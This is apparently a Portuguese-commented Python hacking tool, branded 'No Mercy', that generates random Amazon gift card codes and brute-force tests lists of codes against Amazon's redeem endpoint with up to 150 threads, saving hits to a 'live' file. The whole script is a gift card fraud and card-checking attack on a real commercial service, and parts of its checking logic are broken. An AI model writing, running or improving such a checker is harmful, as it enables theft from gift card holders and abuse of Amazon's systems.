import requests
import threading
import time
from colorama import init, Fore
import ctypes
import string
import random

# Inicializa o Colorama para cores no terminal
init(convert=True)

# Texto ASCII art personalizado
text = '''
                 ░█████╗░░█████╗░██╗░░░██╗██╗░░░██╗░██████╗██╗░░██╗
                 ██╔══██╗██╔══██╗██║░░░██║██║░░░██║██╔════╝██║░░██║
                 ██║░░╚═╝██║░░██║██║░░░██║██║░░░██║╚█████╗░███████║
                 ██║░░██╗██║░░██║██║░░░██║██║░░░██║░╚═══██╗██╔══██║
                 ╚█████╔╝╚█████╔╝╚██████╔╝╚██████╔╝██████╔╝██║░░██║
                 ░╚════╝░░╚════╝░░╚═════╝░░╚═════╝░╚═════╝░╚═╝░░╚═╝
                 
                                       No Mercy. 
                  
                                   @descriptografado  
'''
print(Fore.CYAN + text + '\n\n')
print(Fore.CYAN + '[1] Gerar Gift(s) \n[2] Testar Gifts.\n' + Fore.WHITE, end='')
option = str(input())

# Função para gerar gifts
def gerar_gifts(amount):
    fix = 0
    with open('gift_talokan.txt', 'a') as f:
        while fix < amount:
            code = ('').join(random.choices(string.ascii_letters.upper() + string.digits.upper(), k=13))
            f.write(code.upper() + '\n')
            print(Fore.GREEN + code.upper())
            fix += 1
            ctypes.windll.kernel32.SetConsoleTitleW("Gifts Gerados: " + str(fix) + "/" + str(amount))

# Função para carregar os gifts do arquivo
def load_accounts():
    giftcards = []
    with open('logins.txt', 'r', encoding='utf8') as f:
        for x in f.readlines():
            giftcards.append(x.strip())
    return giftcards

# Função para salvar gifts válidos
def save(giftcard):
    with open('live.txt', 'a', encoding='utf8') as f:
        f.write(giftcard + '\n')

# Função para testar os gifts
def checker(giftcards, num, valid, invalid):
    success_keyword = """ <b>Enter claim code</b> """
    try:
        r = requests.post("https://www.amazon.com/gc/redeem?ref_=gcui_b_e_r_c_d_b_w", data={"giftcard": giftcards[num]})
        if success_keyword in r.text:
            valid += 1
            print(Fore.GREEN + '[Aprovado] ' + giftcards[num])
            save(giftcards[num])
        else:
            print(Fore.RED + '[Reprovado] ' + giftcards[num])
            invalid += 1
    except Exception as e:
        print(Fore.YELLOW + f'[Erro] {e}')

# Função principal para testar gifts
def testar_gifts():
    giftcards = load_accounts()
    num = 0
    valid = 0
    invalid = 0

    while num < len(giftcards):
        if threading.active_count() < 150:
            threading.Thread(target=checker, args=(giftcards, num, valid, invalid)).start()
            time.sleep(0.25)
            num += 1

# Executa a função correspondente à opção escolhida
if option == '1':
    amount = int(input('Quantidade de Gifts: '))
    gerar_gifts(amount)
elif option == '2':
    testar_gifts()
else:
    print(Fore.RED + "Opção inválida. Escolha 1 ou 2.")